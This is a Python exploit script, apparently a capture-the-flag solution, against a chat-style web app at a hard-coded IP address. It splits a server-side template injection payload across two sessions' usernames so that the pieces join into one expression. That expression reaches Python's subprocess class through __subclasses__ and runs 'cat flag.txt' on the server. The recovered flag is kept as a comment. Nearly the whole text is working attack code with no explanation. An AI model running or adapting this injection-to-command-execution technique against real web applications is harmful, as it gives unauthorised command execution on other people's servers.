import requests

url = "http://34.44.129.8:56839"
payload = '1.__class__.__mro__[1].__subclasses__()[564](["cat", "flag.txt"], stdout=-1).communicate()'

s1 = requests.session()
s1.post(url + "/set_username", data={"username": '{{' + f'{payload} if 1 else """'})

s2 = requests.session()
s2.post(url + "/set_username", data={"username": '"""}}'})

s1.post(url + "/send_message", data={"message": "1"})
s2.post(url + "/send_message", data={"message": "1"})

resp = s1.get(url)
print(resp.text)

# LITCTF{1m_g0nn4_h4v3_t0_d0_m0r3_t0_5t0p_7he_1n3v1t4bl3_f0rw4rd_br4c3_f0rw4rd_br4c3_b4ckw4rd_br4c3_b4ckw4rd_br4c3}
